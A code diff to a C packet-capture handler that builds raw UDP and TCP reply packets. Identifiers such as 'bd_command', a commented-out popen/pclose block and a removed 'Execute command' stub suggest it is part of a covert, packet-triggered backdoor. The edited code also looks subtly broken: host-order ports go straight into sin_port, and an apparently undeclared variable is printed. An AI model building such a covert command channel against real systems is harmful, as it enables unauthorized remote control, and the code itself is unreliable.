@@ -522,13 +522,13 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     u_short sport = 0; // Source port is the destination port of the packet
     int skt;
     if(packet_info.ip->ip_p == IPPROTO_UDP){
-        dport = packet_info.udp->uh_sport;
-        sport = packet_info.udp->uh_dport;
+        dport = ntohs(packet_info.udp->uh_sport);
+        sport = ntohs(packet_info.udp->uh_dport);
         skt = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
     }
     else if(packet_info.ip->ip_p == IPPROTO_TCP){
-        dport = packet_info.tcp->th_sport;
-        sport = packet_info.tcp->th_dport;
+        dport = ntohs(packet_info.tcp->th_sport);
+        sport = ntohs(packet_info.tcp->th_dport);
         skt = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
     }
     
@@ -568,6 +568,8 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     dst_host.sin_family = AF_INET;
     dst_host.sin_addr.s_addr = packet_info.ip->ip_src.s_addr;
     dst_host.sin_port = dport;
+    
+    printf("IP address: %s\n",inet_ntoa(hostaddr->sin_addr));
     
     /* Prepare address info structure for raw packet crafting */
     
@@ -611,19 +613,6 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     free(bd_command);
     close(sockfd);
     pclose(fp);*/
-}
-
-/*
-| ------------------------------------------------------------------------------
-| Execute command
-| ------------------------------------------------------------------------------
-*/
-
-void server_command(char *bd_command, struct sockaddr_in *dst_host){
-    
-    
-    
-    
 }
 
 /*
